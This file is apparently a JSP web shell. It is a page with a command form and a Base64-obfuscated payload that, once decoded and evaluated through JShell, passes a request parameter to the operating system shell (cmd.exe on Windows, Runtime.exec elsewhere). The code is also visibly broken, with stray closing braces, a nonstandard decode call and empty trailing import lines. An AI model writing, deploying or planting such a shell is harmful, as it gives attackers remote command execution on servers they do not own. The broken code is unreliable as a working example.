<%@ page import="jdk.jshell.JShell, java.lang.StringBuilder, java.io.BufferedReader, java.io.InputStreamReader, java.io.IOException, java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
        try(JShell js = JShell.create(); BufferedReader br = new BufferedReader(new InputStreamReader(Base64.decode("ICAgIFN0cmluZyBoaWRkID0gZ2V0UGFyYW1ldGVyKCJpbiIpOw0KICAgIFByb2Nlc3MgcDsNCiAgICBpZiAoIFN5c3RlbS5nZXRQcm9wZXJ0eSgib3MubmFtZSIpLnRvTG93ZXJDYXNlKCkuaW5kZXhPZigid2luZG93cyIpICE9IC0xKXsNCiAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImNtZC5leGUgL0MgIiArIGhpZGQpOw0KICAgIH0NCiAgICBlbHNlew0KICAgICAgICBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhoaWRkKTsNCiAgICB9")))) {

            js.onSnippetEvent(snip -> {
                if (snip.status() == jdk.jshell.Snippet.Status.VALID) {
                    out.println("➜ " + snip.value());
                }
            });

            out.print("> ");
            for (String line = br.readLine(); line != null; line = br.readLine()) {
                js.eval(js.sourceCodeAnalysis().analyzeCompletion(line).source());
                out.print("> ");
            }
        }
    }
}   
%>
</pre>
</BODY></HTML>


import ;
import ;
import ;
import ;
import ;

